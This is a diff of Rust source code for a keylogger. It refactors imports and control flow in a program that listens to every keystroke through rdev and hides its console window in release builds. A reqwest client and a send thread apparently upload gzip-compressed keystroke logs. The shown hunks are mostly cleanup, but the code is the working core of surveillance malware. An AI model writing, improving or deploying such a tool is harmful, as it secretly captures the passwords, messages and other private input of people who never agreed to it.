@@ -1,13 +1,13 @@
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
-use std::{fs::File, io::{BufWriter, Read, Write}, time::{SystemTime, UNIX_EPOCH}};
+use std::{fs::File, io::{BufWriter, Read, Write}};
 use flate2::{write::GzEncoder, Compression};
-use rdev::{listen, Event, EventType, Key};
-use serde::Serialize;
+use rdev::{listen, Event};
 use reqwest::Client;
 use tokio::{select, sync::watch};
 use std::sync::{Arc, Mutex};
 use clap::Parser;
+use crate::keylog::{KeyAggregator, KeylogEntry};
 
 mod keylog;
 
@@ -177,11 +177,9 @@ async fn main() -> anyhow::Result<()> {
             eprintln!("Listen error: {:?}", error);
         }
         stop_tx.send(true)?;
-        let _ = send_thread.await?;
-    } else {
-        if let Err(error) = listen(callback) {
-            eprintln!("Listen error: {:?}", error);
-        }
+        send_thread.await?;
+    } else if let Err(error) = listen(callback) {
+        eprintln!("Listen error: {:?}", error);
     }
 
     println!("Keylogger stopped");
